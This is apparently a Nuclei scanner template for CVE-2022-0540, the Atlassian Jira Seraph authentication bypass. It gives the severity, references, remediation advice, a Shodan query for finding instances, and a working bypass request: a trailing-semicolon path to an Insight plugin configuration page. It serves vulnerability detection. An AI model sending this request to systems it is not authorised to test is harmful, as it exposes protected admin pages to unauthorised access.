id: CVE-2022-0540

info:
  name: Atlassian Jira Seraph - Authentication Bypass
  author: DhiyaneshDK
  severity: critical
  description: |
    Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.
  remediation: Ensure you are using the latest version and that all security patches have been applied.
  reference:
    - https://blog.viettelcybersecurity.com/cve-2022-0540-authentication-bypass-in-seraph/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0540
    - https://confluence.atlassian.com/display/JIRA/Jira+Security+Advisory+2022-04-20
    - https://jira.atlassian.com/browse/JRASERVER-73650
    - https://jira.atlassian.com/browse/JSDSERVER-11224
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0540
    cwe-id: CWE-287
    epss-score: 0.158
    epss-percentile: 0.95401
    cpe: cpe:2.3:a:atlassian:jira_data_center:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: atlassian
    product: jira_data_center
    shodan-query: http.component:"Atlassian Jira"
  tags: cve,cve2022,atlassian,jira,exposure,auth-bypass

http:
  - method: GET
    path:
      - '{{BaseURL}}/InsightPluginShowGeneralConfiguration.jspa;'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'General Insight Configuration'

      - type: status
        status:
          - 200
# digest: 4a0a0047304502207c63c0f4f77902a269ca9d0ae38acd37719fd4e80b8b924f3ad79034d2205e6e022100b12b5712e59bcf3e4a8dd5624b87f768cf519485d758c74b51659fe7da1601fc:922c64590222798bb761d5b6d8e72950